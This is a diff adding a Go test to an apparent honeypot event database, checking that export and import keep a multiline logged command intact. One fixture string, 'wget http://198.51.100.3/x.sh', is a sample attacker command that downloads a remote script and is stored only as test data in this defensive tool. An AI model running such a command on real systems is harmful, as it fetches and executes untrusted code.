@@ -1,6 +1,7 @@
 package database
 
 import (
+	"bytes"
 	"context"
 	"crypto/rand"
 	"encoding/base64"
@@ -144,5 +145,37 @@ func TestPGIOCKeepsTechnique(t *testing.T) {
 	}
 	if tech != "T1105" {
 		t.Fatalf("technique_id = %q after re-sighting, want T1105", tech)
+	}
+}
+
+// Export then import must restore every row, including commands with newlines.
+func TestPGExportImportMultilineCommand(t *testing.T) {
+	ts := connectPG(t)
+	ctx := context.Background()
+	now := time.Now().UTC().Truncate(time.Second)
+	for i, cmd := range []string{"echo a\nwget http://198.51.100.3/x.sh", "uname -a"} {
+		ev := &Event{Timestamp: now.Add(time.Duration(i) * time.Second), Honeypot: "cowrie",
+			SourceIP: "203.0.113.6", EventType: "command", Command: cmd}
+		if err := ts.InsertEvent(ctx, ev); err != nil {
+			t.Fatal(err)
+		}
+	}
+	var buf bytes.Buffer
+	if err := ts.ExportData(ctx, now.Add(-time.Minute), now.Add(time.Minute), &buf); err != nil {
+		t.Fatal(err)
+	}
+	if _, err := ts.pool.Exec(ctx, `TRUNCATE events`); err != nil {
+		t.Fatal(err)
+	}
+	if err := ts.ImportData(ctx, &buf); err != nil {
+		t.Fatal(err)
+	}
+	var n int
+	var cmd string
+	if err := ts.pool.QueryRow(ctx, `SELECT count(*), COALESCE(MAX(command) FILTER (WHERE command LIKE 'echo%'),'') FROM events`).Scan(&n, &cmd); err != nil {
+		t.Fatal(err)
+	}
+	if n != 2 || cmd != "echo a\nwget http://198.51.100.3/x.sh" {
+		t.Fatalf("imported %d rows, multiline command %q; want 2 rows and the original command", n, cmd)
 	}
 }
